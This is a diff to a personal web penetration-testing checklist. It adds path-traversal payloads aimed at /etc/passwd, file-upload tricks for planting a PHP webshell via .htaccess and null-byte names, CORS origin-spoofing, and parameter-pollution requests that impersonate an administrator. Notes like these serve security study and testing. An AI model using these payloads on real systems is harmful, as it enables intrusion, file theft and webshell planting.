@@ -6,11 +6,14 @@ Remember:
     	Check for SameSite Restriction
     Check sitemap and JS resources
     	"Access-Control-Allow-Origin" can contain subdomain ==> attack surface
+    	local redirects (XSS to bypass CSRF)
+    	API endpoints
     Inspect websocket request
     Check input fields
     	XSS
     Check Requests
     	Check for csrf token
+    Check /api and api documentations
 
 The Sledge Hammer <DANGER>:
     Brute Force Dir
@@ -18,8 +21,21 @@ The Sledge Hammer <DANGER>:
 
 Try:
     Add in header: X-Forwarded-For: 127.0.0.1
-    Path Traversal
+    Path Traversal (Check image file path)
         GET /image?filename=../../../etc/passwd HTTP/2
+        GET /image?filename=/etc/passwd HTTP/2
+        ....// or ....\/
+        %2e%2e%2f or %252e%252e%252f or ..%c0%af or ..%ef%bc%8f
+        ../../../etc/passwd%00.png
+        
+        %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00.png
+    File Upload
+    	upload shell at filename="%2e%2e%2f%2e%2e%2feasy-simple-php-webshell.php"
+    	Upload/Replace web.config or .htaccess and use the need aliased extension. FIND WEBSERVER IMPL
+    		upload webconfig to override their config
+    		AddType application/x-httpd-php .l33t
+    		Try ofuscation: "shell.php%00.png"
+    		Try putting payload in image exiftool "-comment<=<filename>" <imagename>
     SSRF: Does website make http requests?
         http://127.0.0.1/admin/
         http://127.0.0.1:80
@@ -56,17 +72,38 @@ Try:
 			Try as getheader: exploit-site.com/?vuln-site.com
 				need header value Referrer-Policy: unsafe-url
 			Try subdomain: vuln-site.com.exploit-site.com
-		
+	CORS: 
+    		Look for response header: Access-Control-Allow-Credentials, append origin into your header, and does Access-Control-Allow-Origin show up?
+    		Try screwing with the origin: normalsite.com --> hacker.normalsite.com or normalsite.com.hacker.com
+    		Try inserting: Origin: null
+    		Try subdomain with XSS vuln (subdomain may use http instead of https):
+    			Origin: https://subdomain.vul-site.com
+    			Origin: http://vuln-site.com
+    put OPTION as request type for enumeration
+    API 
+    		If expecting json, try using xml
+    		Mass assignment: add hidden parameter (revealed in GET request) into PATCH request
+    		
+    		Server Side Parameter Pollution
+    			Truncate serverside query with %23 is # 
+    			
+    			Inject parameter
+    			GET /userSearch?name=peter%26email=foo&back=/home
+    			
+    			Override parameter
+    			GET /userSearch?name=peter%26name=administrator&back=/home
+    
             	
     
 Common Dirs:
     login
     robots.txt
+    api
 
 Common Files/Links:
     cyberchef.org
     www.jwt.io
-    PHP shell:
+    payloads: https://github.com/antichown/burp-payloads/tree/master
 
     
 
